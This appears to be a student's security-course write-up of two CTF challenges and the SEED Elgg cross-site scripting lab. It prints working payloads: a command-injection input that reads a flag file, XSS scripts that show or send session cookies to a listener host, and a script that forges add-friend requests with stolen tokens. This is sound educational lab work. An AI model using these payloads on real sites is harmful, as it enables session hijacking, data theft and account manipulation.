# Trabalho realizado na semana #10 e #11


---

## CTF 


### Week 10 - Challenge 1

To solve the challenge, after we send a message, we go to a page where we can see two buttons, <kbd>Give the flag</kbd> and <kbd>Mark request as read</kbd>. So we look at the html code for the first button.

![](https://i.imgur.com/fOZf9Rt.png)

The goal is for the administrator to click on the <kbd>Give the flag</kbd> button, that is disabled. So we can fetch the element through getElementById() and click on it whenever someone enters the page through click(). So we added the following script to the message field:

![](https://i.imgur.com/fLpO3BZ.png)


flag: 

```
flag{403857a41c769eefb23575fddb088e50}
```

### Week 10 - Challenge 2

When we analyzed the pages, we found that there was a PING page, a tool that has a vulnerability. 

So, we can execute multiple commands and if separated by a **;** it executes the last one after finishing the others. So we can use the cat command to get the flag. In the statement, we are told that the flag is in the path /flags/flag.txt. So, with input <kbd> ; cat /flags/flag.txt </kbd> we get the flag.


![](https://i.imgur.com/RZQ50ZD.png)


flag:
```
flag{deca6448aca3b011b752a055b9ab0abf}
```

## Cross-Site Scripting Attack Lab (Elgg)

### Task 1

For this task we just needed to log in as any one of the users in the database (with the credentials given) and edit the user's brief description to have the following script:

```
<script>alert('XSS');</script>
```

This will trigger an alert message when any user enters that profile.

When logged in as Boby, if we entered Alice's profile we got the following result:

![](https://i.imgur.com/Qj4csUN.png)


### Task 2 

By changing the user's brief description to the following line, the user's cookies are displayed in the alert window.

```
<script>alert(document.cookie);</script>
```
Result:
![](https://i.imgur.com/dRkeTnh.png)



### Task 3


For this task, we edited Alice's brief description section to:
```
<script>
document.write(’<img src=http://10.9.0.1:5555?c=’+ escape(document.cookie) + ’ >’);
</script>

```

After this, we typed the <kbd>nc -lknv 5555</kbd> command to listen to the TCP port 5555 and get the cookies of other users. In this case, Alice's cookies.
We logged in with Samy's account and visited Alice's profile, obtaining the following result in the terminal:

![](https://i.imgur.com/kIsKz8s.png)

### Task 4

The goal is to when a user visits Samy's profile, that user automatically becomes their friend.

We sent a friend request from Alice to Boby and by observing HTTP Header Live, we understood how a add-friend HTTP request looks like.

The URL was:
```
http://www.seed-server.com/action/friends/add?friend=57&__elgg_ts=1669809008&__elgg_token=hsN2GkfsXNgU1itbZV2qTQ&__elgg_ts=1669809008&__elgg_token=hsN2GkfsXNgU1itbZV2qTQ
```

Next, we replicated the above code and replaced the field,<kbd>friend=57</kbd>, with Samy's id, <kbd>friend=59</kbd>, for our exploit:

```
<script type="text/javascript">
    window.onload = function () {
        var Ajax = null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

        //Construct the HTTP request to add Samy as a friend.
        var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token + ts + token; // <--- THIS LINE

        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```

With this script, any user that accesses Samy's profile, automatically becomes their friend. 

Example:
When we logged in with Alice's profile and accessed Samy's profile page, they automatically became friends.

![](https://i.imgur.com/ScOyhzn.png)